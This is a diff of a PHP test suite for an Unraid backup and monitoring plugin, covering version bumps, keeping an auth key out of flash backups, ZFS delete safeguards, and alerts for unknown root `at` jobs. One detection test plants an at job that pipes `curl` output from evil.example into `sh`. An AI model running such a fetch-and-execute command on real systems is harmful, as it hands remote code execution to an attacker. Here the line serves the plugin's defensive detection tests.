@@ -6760,7 +6760,7 @@ SH);
     $st = json_decode((string) @file_get_contents("$st0/new-local.json"), true);
     $ks = json_decode((string) @file_get_contents("$st0/kept-local.json"), true);
     same('kept (2.38): state - new-local.json only the new app\'s folder; kept-local.json the local app\'s two with their rules',
-        [[['appdata', 'newappdir']], [['appdata', 'locnew', ['/locnew/']], ['appdata', 'locold', ['/locold/']]], '2.83'],
+        [[['appdata', 'newappdir']], [['appdata', 'locnew', ['/locnew/']], ['appdata', 'locold', ['/locold/']]], '2.84'],
         [array_map(fn ($f) => [$f['share'], $f['folder']], $st['folders'] ?? []), array_map(fn ($f) => [$f['share'], $f['folder'], $f['rules']], $ks['folders'] ?? []), $ks['version'] ?? null]);
     $notes = (string) @file_get_contents("$tmp/fake/notify.log");
     check('kept (2.38): one notification - only the new app\'s folder', substr_count($notes, "\n") === 1 && str_contains($notes, 'appdata/newappdir') && !str_contains($notes, 'locnew') && !str_contains($notes, 'locold'), $notes);
@@ -8914,9 +8914,9 @@ function testDataTrust(): void
         [$e1, $e2, str_contains($err1, "REFUSED: $tmp/nobody is not root's own"), str_contains($err2, 'REFUSED'),
          array_values(array_diff(scandir("$tmp/nobody"), ['.', '..'])), str_contains((string) @file_get_contents("$tmp/notified"), 'alert')]);
     $ver = fn (string $f) => preg_match('/Version (\d+\.\d+)/', (string) file_get_contents(OFFICE_DIR . "/backup/$f"), $m) ? $m[1] : null;
-    same('data trust: the engine\'s version 2.83 everywhere it is named', ['2.83', '2.83', true, true],
-        [$ver('backup.sh'), $ver('setup.sh'), str_contains((string) file_get_contents($lib), 'UB_VERSION="2.83"'),
-         str_contains((string) file_get_contents(OFFICE_DIR . '/backup/README.md'), '- **2.83** –')]);
+    same('data trust: the engine\'s version 2.84 everywhere it is named', ['2.84', '2.84', true, true],
+        [$ver('backup.sh'), $ver('setup.sh'), str_contains((string) file_get_contents($lib), 'UB_VERSION="2.84"'),
+         str_contains((string) file_get_contents(OFFICE_DIR . '/backup/README.md'), '- **2.84** –')]);
     // 2.81 (B42): a run with settings.ini gone ends with a code the office says in its own words - never the script's name
     $gone = $mk('nosettings', 0700);
     @unlink("$tmp/notified");
@@ -10404,7 +10404,7 @@ SH);
 
     // --- --about keeps interface 1
     $about = json_decode((string) shell_exec('bash -c ' . escapeshellarg("$env; bash " . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . ' --about')), true) ?: [];
-    same('partner phase: --about - interface 1, version 2.83', [1, '2.83'], [$about['interface'] ?? null, $about['version'] ?? null]);
+    same('partner phase: --about - interface 1, version 2.84', [1, '2.84'], [$about['interface'] ?? null, $about['version'] ?? null]);
 
     // --- setup.sh: the plan lists the partners (from the Team Lead's pairs; never connects) and per unit whether it can travel
     $settings(0);
@@ -10635,6 +10635,76 @@ SH);
  * setup's Apply accepts (only the plan's partners), the Dashboard's line while a run sends to a partner.
  */
 /**
+ * Code review 1.81.0, S4 (engine 2.84): what never leaves the flash is ONE list (lib/common.sh FLASH_NEVER) for both ways
+ * the flash leaves the server - the archive's tar excludes and the Kopia source _flash's ignore rules. Up to 2.83 only
+ * flash.tar.gz left the USO network's auth key out; the flash as a ZFS snapshot went to Kopia whole. The run sets the
+ * rules on the flash's policy right before its upload (flash_policy_align); when Kopia won't take them and such a file
+ * lies in the snapshot, the flash is not uploaded (err_code flash_never_policy); nothing of it there: a warning, uploaded.
+ * The functions run alone with stand-ins (kopia_x records, fails on a mark; kopia_one / kopia_skip record).
+ */
+function testBackupFlashNever(): void
+{
+    $tmp = hardeningTmp('backup-flash-never');
+    $flash = "$tmp/boot/config/plugins/unraid-secretary-office/usonet";
+    foreach ([$flash, "$tmp/stage", "$tmp/mnt/_flash/config/plugins/unraid-secretary-office/usonet", "$tmp/unraid-backup/state"] as $d) {
+        @mkdir($d, 0700, true);
+    }
+    file_put_contents("$tmp/boot/config/go", "#!/bin/bash\n");
+    file_put_contents("$flash/usonet.cfg", "JOINED=\"no\"\n");
+    file_put_contents("$flash/authkey", "tskey-auth-kSecret99-ZyXwVuTsRqPoNmLk\n");
+    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
+    $bsh = escapeshellarg(OFFICE_DIR . '/backup/backup.sh');
+    $fn = fn (string $name) => "eval \"\$(sed -n '/^$name() {/,/^}/p' $bsh)\"; ";
+    $rule = '/config/plugins/unraid-secretary-office/usonet/authkey';
+    $sh = fn (string $code) => trim((string) shell_exec('bash -c ' . escapeshellarg("UB_DATA=$tmp/unraid-backup; source $lib >/dev/null 2>&1; LOG_FILE=/dev/null; " . $code) . ' 2>&1'));
+    // the one list: the archive's excludes and Kopia's rules come from it; the user's own flash rules stay beside
+    $out = $sh('FLASH_KOPIA_IGNORE=("/previous/" "/bz*"); flash_never_tar; echo --; kopia_want_ignores flash; echo --; FLASH_NEVER_OK=; flash_never_present ' . escapeshellarg("$tmp/mnt/_flash") . '; echo present=$?');
+    same('flash never: one list - tar\'s exclude from ., Kopia\'s rule anchored, beside the user\'s own kopia_ignore; nothing of it in an empty snapshot',
+        "--exclude=./config/plugins/unraid-secretary-office/usonet/authkey\n--\n/bz*\n$rule\n/previous/\n--\npresent=1", $out);
+    // the archive: the key never in it (as 2.76 did it - now from the list)
+    $out = $sh('log() { :; }; err() { echo "ERR $*"; }; human() { :; }; pkg_mark() { :; }; declare -A PKG_RESULT=(); PKG_STAGE=' . escapeshellarg("$tmp/stage")
+        . '; UB_BOOT=' . escapeshellarg("$tmp/boot") . '; FLASH_TAR_EXCLUDE=("./bz*"); ' . $fn('flash_tar') . 'flash_tar; tar -tzf ' . escapeshellarg("$tmp/stage/flash/flash.tar.gz") . ' | sort');
+    same('flash never: the archive - the flash in it, its USO network config too, the auth key never', [true, true, false, false],
+        [str_contains($out, './config/go'), str_contains($out, 'usonet/usonet.cfg'), str_contains($out, 'authkey'), str_contains($out, 'ERR')]);
+    // the Kopia way: kopia_flash_one sets the rule on the flash's policy first, then uploads
+    $stubs = 'log() { :; }; warn() { echo "WARN $*"; }; err() { echo "ERR $*"; }; array_stop_check() { :; }; k_path() { printf /uso/_flash; }; declare -A KMI=([/uso/_flash]=ro); '
+        . 'kopia_x() { echo "kopia $*" >>' . escapeshellarg("$tmp/kopia.log") . '; [[ -e ' . escapeshellarg("$tmp/kopia-no") . ' ]] && return 1; return 0; }; kopia_one() { echo "one $1 $2"; }; kopia_skip() { echo "skip $1"; }; '
+        . 'MOUNT_ROOT=' . escapeshellarg("$tmp/mnt") . '; PLAN_FLASH=snapshot; KOPIA_ID=root@kopia; FLASH_NEVER_OK=; WARN_ITEMS=(); WARN_ITEM_ERR=(); ' . $fn('kopia_flash_one')
+        . 'kopia_flash_one; echo "ok=$FLASH_NEVER_OK items=${WARN_ITEMS[*]:-} err=${#WARN_ITEM_ERR[@]}"';
+    $kopia = function () use ($tmp): string {
+        $l = trim((string) @file_get_contents("$tmp/kopia.log"));
+        @unlink("$tmp/kopia.log");
+        return $l;
+    };
+    $out = $sh($stubs);
+    same('flash never: before the upload the rule goes onto the flash\'s policy (policy set --add-ignore, the identity\'s path, into the log), then the upload',
+        ["kopia policy set root@kopia:/uso/_flash --add-ignore $rule", "one flash /uso/_flash\nok=yes items= err=0"], [$kopia(), $out]);
+    // Kopia says no: the key in the snapshot - not uploaded, an error the office says (flash_never_policy, the file named)
+    touch("$tmp/kopia-no");
+    file_put_contents("$tmp/mnt/_flash/config/plugins/unraid-secretary-office/usonet/authkey", "tskey-auth-kSecret99-ZyXwVuTsRqPoNmLk\n");
+    $out = $sh($stubs);
+    same('flash never: Kopia won\'t take the rule and the key lies in the snapshot - no upload, the flash skipped, an error with a code naming the file',
+        [true, false, true, "items=flash_never_policy\x1ffile=config/plugins/unraid-secretary-office/usonet/authkey err=1", true],
+        [$kopia() === "kopia policy set root@kopia:/uso/_flash --add-ignore $rule", str_contains($out, 'one flash'), str_contains($out, "skip flash\n"),
+         substr($out, (int) strpos($out, 'items=')), str_contains($out, 'ERR Kopia: flash not uploaded')]);
+    // Kopia says no but nothing of the list lies in the snapshot: a warning, uploaded
+    unlink("$tmp/mnt/_flash/config/plugins/unraid-secretary-office/usonet/authkey");
+    $out = $sh($stubs);
+    same('flash never: Kopia won\'t take the rule, nothing of the list in the snapshot - a warning, uploaded all the same', [true, true, false, 'ok= items= err=0'],
+        [str_contains($out, 'WARN Kopia: the flash\'s policy would not take'), str_contains($out, "\none flash /uso/_flash\n"), str_contains($out, 'skip'), substr($out, (int) strpos($out, 'ok='))]);
+    // the policy check: only the never-rules missing from the flash's policy is no drift (the run sets them); anything else is
+    $out = $sh('KP_CODES=("ignore_missing"$\'\x1f\'' . escapeshellarg($rule) . '$\'\x1f\x1f\'); flash_never_only_missing; echo a=$?; '
+        . 'KP_CODES+=("ignore_missing"$\'\x1f/previous/\x1f\x1f\'); flash_never_only_missing; echo b=$?; KP_CODES=(); flash_never_only_missing; echo c=$?; '
+        . 'KP_CODES=("retention"$\'\x1fkeep-latest\x1f7\x1f3\'); flash_never_only_missing; echo d=$?');
+    same('flash never: the policy check - only the never-rules missing is no drift; another rule, nothing, a retention difference are', "a=0\nb=1\nc=1\nd=1", $out);
+    $src = (string) file_get_contents(OFFICE_DIR . '/backup/lib/common.sh');
+    check('flash never: the drift check takes that path for the flash, and the archive\'s hard-coded exclude is gone (the list alone)',
+        str_contains($src, 'elif [[ "$kind" == "flash" ]] && flash_never_only_missing; then')
+        && !str_contains((string) file_get_contents(OFFICE_DIR . '/backup/backup.sh'), 'ex+=( "--exclude=./config/plugins/unraid-secretary-office/usonet/authkey" )'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * Code review 1.72.0, the engine's small ones, each function taken out of backup.sh and run alone with stand-ins:
  * M1 the flash archive never holds the USO network's auth key (whatever tar_exclude says); L7 a rate change told only
  * to a pid that is still pv (a slot waiting for ssh and the door while its pv's pid came round to another process).
@@ -10650,7 +10720,9 @@ function testBackupReview172(): void
     file_put_contents("$tmp/boot/config/plugins/unraid-secretary-office/usonet/authkey", "tskey-auth-kSecret99-ZyXwVuTsRqPoNmLk\n");
     $bsh = escapeshellarg(OFFICE_DIR . '/backup/backup.sh');
     $fn = fn (string $name) => "eval \"\$(sed -n '/^$name() {/,/^}/p' $bsh)\"; ";
-    $out = (string) shell_exec('bash -c ' . escapeshellarg('log() { :; }; err() { echo "ERR $*"; }; human() { :; }; pkg_mark() { :; }; declare -A PKG_RESULT=(); '
+    @mkdir("$tmp/unraid-backup/state", 0700, true);
+    $out = (string) shell_exec('bash -c ' . escapeshellarg("UB_DATA=$tmp/unraid-backup; source " . escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh') . ' >/dev/null 2>&1; '     // 2.84: the list of what never leaves the flash
+        . 'log() { :; }; err() { echo "ERR $*"; }; human() { :; }; pkg_mark() { :; }; declare -A PKG_RESULT=(); '
         . 'PKG_STAGE=' . escapeshellarg("$tmp/stage") . '; UB_BOOT=' . escapeshellarg("$tmp/boot") . '; LOG_FILE=/dev/null; FLASH_TAR_EXCLUDE=("./bz*"); '
         . $fn('flash_tar') . 'flash_tar; tar -tzf ' . escapeshellarg("$tmp/stage/flash/flash.tar.gz") . ' | sort') . ' 2>&1');
     same('engine review M1: the flash archive - the flash as it is, the USO network\'s config in it, its auth key never',
@@ -11200,7 +11272,7 @@ SH);
         [['UnraidSecretaryOffice' => 'ok:', 'app:c2' => 'skipped:asleep', 'appdata' => 'ok:', 'media' => 'skipped:asleep'], ['share:appdata' => 'skipped:unreachable', 'share:media' => 'skipped:asleep']],
         [$kr, $pr], json_encode($res));
     same('asleep skip 2.80: results.json - v 1, the engine, this run; a good upload\'s good is its time, a skipped one has none yet',
-        [1, '2.83', $s['run'] ?? null, $res['kopia']['appdata']['time'] ?? -1, 0],
+        [1, '2.84', $s['run'] ?? null, $res['kopia']['appdata']['time'] ?? -1, 0],
         [$res['v'] ?? null, $res['engine'] ?? null, $res['run'] ?? null, $res['kopia']['appdata']['good'] ?? null, $res['kopia']['media']['good'] ?? null]);
     check('asleep skip: the log - one line for the pool', str_contains($l, 'ZFS hazel: asleep - left out this run (asleep_pools = skip)') && substr_count($l, 'ZFS hazel: asleep - left out') === 1, $l);
     check('asleep skip: last-run asleep=4, history asleep.units 4', str_contains((string) @file_get_contents("$data/state/last-run"), "asleep=4\n") && ($lastHistory()['asleep']['units'] ?? null) === 4);
@@ -11277,7 +11349,7 @@ SH);
 
     // --- --about keeps interface 1
     $about = json_decode((string) shell_exec('bash -c ' . escapeshellarg("$env; bash " . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . ' --about')), true) ?: [];
-    same('asleep: --about - interface 1, version 2.83', [1, '2.83'], [$about['interface'] ?? null, $about['version'] ?? null]);
+    same('asleep: --about - interface 1, version 2.84', [1, '2.84'], [$about['interface'] ?? null, $about['version'] ?? null]);
 
     // --- setup.sh: the plan carries the key and what sleeps right now; Apply writes the key
     $setup = fn (string $args) => (string) shell_exec('bash -c ' . escapeshellarg("$env UB_SIZE_TIMEOUT=0 UB_EXPLAIN=0; bash " . escapeshellarg(OFFICE_DIR . '/backup/setup.sh') . " $args </dev/null") . ' 2>&1');
@@ -19938,8 +20010,8 @@ function testWatchmanAtUserScript(): void
     $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
     $book = watchmanLoad($data)['book'];
     $us1 = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_userscript'));
-    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is a card (told only days past its time)',
-        [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false, ['at_job' => 1], []],
+    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is a card and told (1.82.0: the round it appears)',
+        [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false, ['at_job' => 1], ['at_job']],
         [$r1['added'], $r2['added'], count($us1), $us1[0]['p']['name'] ?? null, $us1[0]['by'] ?? null, watchmanOpen($us1[0] ?? []),
          watchmanOpenCounts($book), array_column($r2['told'], 'kind')]);
     same('at user script: nothing for the team lead', ['at_job'], array_column(watchmanFindings($book), 'id'));
@@ -20352,8 +20424,8 @@ function testWatchmanAtOnce(): void
     $e = $lines(watchmanLoad($day)['book'], substr($job, 1))[0] ?? [];
     $page = array_values(array_filter(watchmanPageState($day, $t + 1, false)['book'], fn ($x) => $x['id'] === ($e['id'] ?? '')))[0] ?? [];
     $find = array_values(array_filter(watchmanFindings(watchmanLoad($day)['book']), fn ($f) => $f['id'] === 'at_job'))[0] ?? [];
-    same('at: a job he doesn\'t know — a line and a card saying what it is (queued when, by whom, what it starts), not told yet',
-        [['at_job'], [], true, false, 170, 'nobody', '/tmp/x.sh', '–', date('Y-m-d H:i', $t - 10), false, false],
+    same('at: a job he doesn\'t know — a line and a card saying what it is (queued when, by whom, what it starts), told that round (1.82.0)',
+        [['at_job'], ['at_job'], true, false, 170, 'nobody', '/tmp/x.sh', '–', date('Y-m-d H:i', $t - 10), true, false],
         [$r1['added'], array_column($r1['told'], 'kind'), watchmanOpen($e), $e['p']['run'] ?? null, $find['params']['num'] ?? null, $find['params']['user'] ?? null,
          $find['params']['prog'] ?? null, $find['params']['owner'] ?? null, $find['params']['queued'] ?? null, $page['tell'] ?? null, isset($e['important'])]);
     $later = [];
@@ -20362,7 +20434,8 @@ function testWatchmanAtOnce(): void
         $r = watchmanRound($paths, $day, $hired, $t + $dt, $docker, false, $acks);
         $later[] = [$r['added'], array_column($r['told'], 'kind')];
     }
-    same('at: past its time — nothing new; days past it still waiting — told (the same line)', [[[], []], [[], []], [[], ['at_job']]], $later);
+    same('at: past its time — nothing new, not told again; days past it still waiting — the same line, marked important (stuck), not told twice',
+        [[[], []], [[], []], [[], []], true], [...$later, !empty($lines(watchmanLoad($day)['book'], substr($job, 1))[0]['important'])]);
     rename("$src/atjobs/$job", "$src/atjobs/=" . substr($job, 1));
     touch($paths['atjobs'], $t + 3 * 86400 - 5);
     $r = watchmanRound($paths, $day, $hired, $t + 3 * 86400, $docker, false, $acks);
@@ -20390,6 +20463,80 @@ function testWatchmanAtOnce(): void
     $l = $lines(watchmanLoad($day)['book'], substr($job, 1));
     same('at: noted, it stays one closed line while it lives', [[], 1, false], [$again, count($l), watchmanOpen($l[0] ?? [])]);
 
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($day, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * Code review 1.81.0, S6: a root `at` job the watchman doesn't know is told the round it appears — not only when it still
+ * waits two days past its time (1.72.0–1.81.0: a job queued for «now» or minutes ahead, the usual way to run something
+ * once as root, ran and left the queue untold; cron_file_foreign was told all along, so the two ways to schedule root work
+ * differed). Once per job number: the job running or gone the next round adds nothing; a second job is told again.
+ */
+function testWatchmanAtTold(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-attold-' . getmypid();
+    $src = "$tmp/src";
+    $day = "$tmp/data/watchman";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash/user.scripts/scripts', 'emhttp', 'proc/2', 'usrbin'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    @mkdir($day, 0700, true);
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d",
+              'cron_files' => "$src/flash", 'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents",
+              'emhttp_plugins' => "$src/emhttp", 'update_helper' => "$src/usrbin/plugin_update_helper", 'emhttpd' => "$src/proc"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\nnobody:x:99:100::/:/bin/false\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/cron.d/root", "*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n");
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    $head = fn (int $uid = 0) => "#!/bin/sh\n# atrun uid=$uid gid=0\n# mail root 0\numask 22\nPWD=/root; export PWD\nLOGNAME=root; export LOGNAME\nHOME=/root; export HOME\n"
+        . "USER=root; export USER\nSHLVL=2; export SHLVL\nPATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin; export PATH\ncd /root || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $hired = 1793000000;
+    $t = $hired + 3600;
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");
+    $lines = fn (string $n) => array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => watchmanAtOf($e) === $n));
+    // his first look: an empty queue, nothing to tell
+    touch($paths['atjobs'], $t - 5);
+    $r0 = watchmanRound($paths, $day, $hired, $t, $docker, false, $acks);
+    // `at now` as root: the job's file named by its minute, there when he looks the next round
+    $job = 'a000bb' . sprintf('%08x', intdiv($t + 240, 60));
+    file_put_contents("$src/atjobs/$job", $head() . "curl -s https://evil.example/x | sh\n");
+    touch("$src/atjobs/$job", $t + 290);
+    touch($paths['atjobs'], $t + 295);
+    $r1 = watchmanRound($paths, $day, $hired, $t + 300, $docker, false, $acks);
+    $e = $lines(substr($job, 1))[0] ?? [];
+    $find = array_values(array_filter(watchmanFindings(watchmanLoad($day)['book']), fn ($f) => $f['id'] === 'at_job'))[0] ?? [];
+    same('at told (S6): a root job queued for now - a line, the card, and told the round it appeared (sched, important)',
+        [[], [], ['at_job'], ['at_job'], true, true, 0, 'root', 'curl -s https://evil.example/… | sh', 'sched', true, true],     // the URL's path kept short, as always
+        [$r0['added'], array_column($r0['told'], 'kind'), $r1['added'], array_column($r1['told'], 'kind'), watchmanOpen($e), is_int($e['told'] ?? null), $e['p']['uid'] ?? null,
+         $find['params']['user'] ?? null, $e['p']['cmd'] ?? null, WATCH_KINDS['at_job'][0], WATCH_KINDS['at_job'][1], watchmanImportant($e)]);
+    // atd runs it and it leaves the queue: nothing more to tell, the one line stays (told once)
+    unlink("$src/atjobs/$job");
+    touch($paths['atjobs'], $t + 595);
+    $r2 = watchmanRound($paths, $day, $hired, $t + 600, $docker, false, $acks);
+    touch($paths['atjobs'], $t + 895);
+    $r3 = watchmanRound($paths, $day, $hired, $t + 900, $docker, false, $acks);
+    same('at told (S6): the job ran and left - told once, one line, nothing new the rounds after', [[], [], [], [], 1],
+        [$r2['added'], array_column($r2['told'], 'kind'), $r3['added'], array_column($r3['told'], 'kind'), count($lines(substr($job, 1)))]);
+    // a second unknown job, after the kind's quiet hour (WATCH_NOTIFY_QUIET: one notification per kind and hour, the next
+    // holds what came meanwhile): its own line, told again - once per job number
+    $job2 = 'a000bc' . sprintf('%08x', intdiv($t + 7500, 60));
+    file_put_contents("$src/atjobs/$job2", $head() . "/root/fix.sh\n");
+    touch("$src/atjobs/$job2", $t + 7190);
+    touch($paths['atjobs'], $t + 7195);
+    $r4 = watchmanRound($paths, $day, $hired, $t + 7200, $docker, false, $acks);
+    same('at told (S6): another unknown root job - told, once, its own line', [['at_job'], ['at_job'], 1, 1],
+        [$r4['added'], array_column($r4['told'], 'kind'), count($lines(substr($job2, 1))), count($lines(substr($job, 1)))]);
+    $src2 = (string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php');
+    check('at told (S6): the kind is told like cron_file_foreign; a job stuck days past its time is marked important, not told anew',
+        str_contains($src2, "'at_job'               => ['sched', true],") && str_contains($src2, '$late = !$run && $now - (int) $j[\'when\'] >= WATCH_AT_LATE;')
+        && str_contains((string) file_get_contents(OFFICE_DIR . '/docs/GUIDE.md'), 'goes to the notifications once, when it appears'));
     putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
     @unlink(watchmanLockFile($day, 'book'));
     exec('rm -rf ' . escapeshellarg($tmp));
@@ -32958,6 +33105,7 @@ switch ($cmd) {
                 'referenced' => $snap ? $st['snaps'][$target]['used'] : $used($target),
                 'mountpoint' => $st['ds'][$target]['mountpoint'] ?? '-',
                 'guid' => $st['ds'][$target]['guid'] ?? (string) abs(crc32($target)),
+                'origin' => $st['ds'][$target]['origin'] ?? '-',
                 default => '-',
             };
             echo ($f['-o'] ?? '') === 'value' ? "$v\n" : "$p\t$v\n";
@@ -34128,6 +34276,32 @@ function testPartnerAside(): void
         [$r['gone'] ?? null, $r['kept'] ?? null, isset($zfs()['ds'][$old2])]);
     flock($hold, LOCK_UN);
     fclose($hold);
+    // code review 1.81.0 S5 - the one real delete: besides its name the dataset must look like a door copy to ZFS - no clone
+    // (origin -), a snapshot of the engine's shape inside; a clone named like one and an emptied one are kept and said
+    $st = $zfs();
+    $clone = "$ds.old-20261001-0100";
+    $bare = "$ds.old-20261002-0100";
+    $st['ds'][$clone] = ['used' => 300, 'props' => [], 'origin' => "$P/$other/share-appdata@uso-backup-20261009-0100"];
+    $st['snaps']["$clone@uso-backup-20261001-0100"] = ['userrefs' => 0, 'used' => 300, 'written' => 300, 'creation' => 1];
+    $st['ds'][$bare] = ['used' => 0, 'props' => []];
+    file_put_contents("$B[bin]/zfs.json", json_encode($st));
+    partnerTestCalls($B['bin']);
+    $r = $go(['id' => $id, 'step' => 'do', 'confirm' => true, 'datasets' => [$clone, $bare]]);
+    same('let go S5: a clone named like a door copy, and one without a snapshot of the engine\'s shape - kept, said (shape), nothing destroyed, both still there',
+        [0, [['dataset' => $clone, 'unit' => 'share:appdata', 'why' => 'shape'], ['dataset' => $bare, 'unit' => 'share:appdata', 'why' => 'shape']], [], true, true],
+        [$r['gone'] ?? null, $r['kept'] ?? null, array_values(array_filter(partnerTestCalls($B['bin']), fn ($c) => ($c[1] ?? '') === 'destroy')), isset($zfs()['ds'][$clone]), isset($zfs()['ds'][$bare])]);
+    $door = (string) @file_get_contents("$B[data]/partner/door.log");
+    same('let go S5: … why, in the door\'s log; the dialog\'s words for it in all five languages', [true, true, [true, true, true, true, true]],
+        [str_contains($door, "let go: $clone kept - a clone of $P/$other/share-appdata@uso-backup-20261009-0100"), str_contains($door, "let go: $bare kept - no snapshot of the engine's shape inside"),
+         array_map(fn ($l) => str_contains((string) (langFile(OFFICE_WEB . "/desks/caretaker/lang/$l.json")['partner.aside_kept_shape'] ?? ''), '{unit}'), ['en', 'de', 'fr', 'it', 'es'])]);
+    same('let go S5: the look lists them like the door\'s (the name decides there) - the let-go decides on ZFS\'s word', [$clone, $bare, $old2], array_column($go(['id' => $id])['list'] ?? [], 'dataset'));
+    check('let go S5: the one real delete is named as such where the rules say «nothing destroyed»',
+        str_contains((string) file_get_contents(OFFICE_DIR . '/CLAUDE.md'), 'nothing destroyed — the one exception is the')
+        && str_contains((string) file_get_contents(OFFICE_DIR . '/HARDENING.md'), 'This is the one real delete among the partner offices')
+        && str_contains((string) file_get_contents(OFFICE_DIR . '/docs/DEVELOPMENT.md'), 'never destroyed by the door (only the')
+        && str_contains((string) file_get_contents(OFFICE_DIR . '/public/desks/caretaker/partner.js'), "['transfer', 'shape'].includes(k.why)"));
+    unset($st['ds'][$clone], $st['ds'][$bare], $st['snaps']["$clone@uso-backup-20261001-0100"]);
+    file_put_contents("$B[bin]/zfs.json", json_encode($st));
     same('let go: one gone meanwhile — said', 'partner_aside_gone', $go(['id' => $id, 'step' => 'do', 'confirm' => true, 'datasets' => [$old1]])['problem'] ?? null);
     partnerTestCalls($B['bin']);
     same('let go: the pool asleep — refused, nothing destroyed', ['partner_aside_asleep', []],
@@ -57227,7 +57401,7 @@ function testBackupResults(): void
     $local = json_encode([['key' => 'share:appdata', 'result' => 'ok', 'code' => ''], ['key' => 'share:media', 'result' => 'skipped', 'code' => 'asleep']]);
     [$out, $r] = $run($c, $local);
     $pick = fn (?array $e) => $e === null ? null : [$e['result'], $e['code'], $e['time'], $e['good']];
-    same('results 2.80: written - v 1, the engine, the run that wrote it', ['rc=0', 1, '2.83', '20261003-0100', true], [$out, $r['v'] ?? null, $r['engine'] ?? null, $r['run'] ?? null, is_int($r['updated'] ?? null)]);
+    same('results 2.80: written - v 1, the engine, the run that wrote it', ['rc=0', 1, '2.84', '20261003-0100', true], [$out, $r['v'] ?? null, $r['engine'] ?? null, $r['run'] ?? null, is_int($r['updated'] ?? null)]);
     same('results 2.80: none yet - the history folded in first: appdata\'s Kopia failed in B, its newest good copy A\'s; the skipped run nothing',
         [['failed', '', 1990, 990], ['ok', '', 995, 995]], [$pick($r['kopia']['appdata'] ?? null), $pick($r['kopia']['app:Emby'] ?? null)]);
     same('results 2.80: this run - docs uploaded, media skipped asleep, films skipped by the array stop (no why)',
@@ -57256,6 +57430,31 @@ function testBackupResults(): void
     $hist([$line('20261001-0100', 1000, ['kopia' => ['done' => [['name' => 'appdata', 'ok' => true, 'seconds' => 5, 'finished' => 990]]]])]);
     [, $r3] = $run($line('20261005-0100', 5000));
     same('results 2.80: a file that isn\'t JSON - made anew from the history', [['ok', '', 990, 990], 1], [$pick($r3['kopia']['appdata'] ?? null), $r3['v'] ?? null]);
+    // 2.84 (code review 1.81.0, S3): a real server's history - 200 runs of ~1.8 KB, 360 KB in all, far past the kernel's 128 KiB
+    // per argument (MAX_ARG_STRLEN) that made jq say «Argument list too long» up to 2.83 (nostromo: 301 KB, no results.json
+    // ever) - folded in whole: the oldest run's copy known, the newest run's too, the file written
+    @unlink("$data/state/results.json");
+    $big = [];
+    for ($i = 1; $i <= 200; $i++) {
+        $done = [];
+        for ($k = 0; $k < 12; $k++) {
+            $done[] = ['name' => "share-with-a-long-name-$k", 'ok' => true, 'seconds' => 100 + $k, 'finished' => 10000 * $i + $k];
+        }
+        $big[] = $line(sprintf('2026%02d%02d-0100', 1 + intdiv($i - 1, 28), 1 + ($i - 1) % 28), 10000 * $i,
+            ['kopia' => ['done' => $done, 'skipped' => [], 'skipped_why' => (object) [], 'interrupted' => null], 'warning_items' => array_fill(0, 6, ['code' => 'future_files', 'params' => ['name' => str_repeat('n', 60), 'count' => 3]]),
+             'packages' => ['count' => 5, 'warnings' => 0, 'errors' => 0], 'vms' => [['name' => "vm-of-run-$i", 'prepare' => 'shutdown', 'done' => 'shutdown', 'seconds' => 9, 'snapshot' => true]],
+             'partner' => ['done' => [['id' => $pid, 'unit' => 'share:appdata', 'snap' => "uso-backup-run$i", 'bytes' => $i, 'seconds' => 1]], 'skipped' => [], 'failed' => []]]);
+    }
+    $hist($big);
+    [$out, $rb] = $run($line('20261231-0100', 9999000, ['kopia' => ['done' => [['name' => 'docs', 'ok' => true, 'seconds' => 3, 'finished' => 9998900]]]]));
+    same('results 2.84: a history past 128 KiB (a real server\'s) - results.json written, the oldest run\'s copies known, the newest run\'s too, this run\'s',
+        [true, 'rc=0', ['ok', '', 2000011, 2000011], ['ok', '', 10000, 10000], ['ok', '', 2000000, 2000000], ['ok', '', 9998900, 9998900], 200],
+        [filesize("$data/state/history.jsonl") > 131072 * 2, $out, $pick($rb['kopia']['share-with-a-long-name-11'] ?? null), $pick($rb['local']['vm:vm-of-run-1'] ?? null),
+         $pick($rb['local']['vm:vm-of-run-200'] ?? null), $pick($rb['kopia']['docs'] ?? null), count(array_filter(array_keys($rb['local'] ?? []), fn ($k) => str_starts_with($k, 'vm:')))]);
